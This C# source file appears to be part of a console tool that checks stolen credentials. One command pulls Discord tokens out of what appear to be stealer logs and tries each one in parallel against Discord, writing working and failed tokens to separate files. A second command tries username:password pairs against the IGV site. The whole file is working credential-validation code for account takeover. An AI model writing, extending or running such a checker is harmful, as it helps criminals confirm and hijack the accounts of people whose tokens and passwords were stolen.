using Console.Extensions;
using Console.Models;
using Console.Models.Abstractions;
using Console.Models.Attributes;
using Console.Models.Views;
using Core.Discord;
using Core.IGV;
using Core.Models;

namespace Console.Views;

public class ServicesView : ArgsView
{
    private readonly DataService _data;
    private readonly Settings _settings;
    private readonly DiscordChecker _discord;
    private readonly IGVChecker _igv;
    
    public ServicesView(IRoot root, DataService data, Settings settings, DiscordChecker discord, IGVChecker igv) : base(root)
    {
        _data = data;
        _settings = settings;
        _discord = discord;
        _igv = igv;
    }
    
    [Command]
    public async Task Discord()
    {
        StreamWriter? invalid = await _data.CreateWriterAsync("invalid"), valid = await _data.CreateWriterAsync("valid");
        var tokens = _settings.Path.DiscordByLogs().Distinct().ToArray();
        
        await _data.SaveAsync("tokens", tokens);

        if (invalid is null || valid is null)
        {
            _ExitWait();
            return;
        }
        
        async Task WriteInvalid(string token)
        {
            System.Console.Out.WriteInvalidLine(token);
            await invalid.WriteLineAsync(token);
        }
        
        async Task WriteValid(string token)
        {
            System.Console.Out.WriteValidLine(token);
            await valid.WriteLineAsync(token);
        }

        await Parallel.ForEachAsync(tokens,
            async (token, cancel) =>
            {
                if (cancel.IsCancellationRequested) return;

                bool? check;
                
                do
                {
                    check = await _discord.TryLoginAsync(token);
                } while (check is null);

                if (check is false) await WriteInvalid(token);
                else await WriteValid(token);
            });

        invalid.Close();
        valid.Close();
        
        _ExitWait();
    }

    [Command]
    public async Task IGV()
    {
        var lines = _data.ReadAsync("igv.com");

        System.Console.ForegroundColor = ConsoleColor.Green;
        
        await foreach (var account in lines
                     .Select(x => x.Split(':'))
                     .Select(x => new Account(x[0], x[1])))
        {
            if (await _igv.TryLoginAsync(account.Username, account.Password) is {})
                System.Console.Out.WriteValidLine(account.ToString());
            else
                System.Console.Out.WriteInvalidLine(account.ToString());
        }

        System.Console.ForegroundColor = ConsoleColor.White;
        
        _ExitWait();
    }
}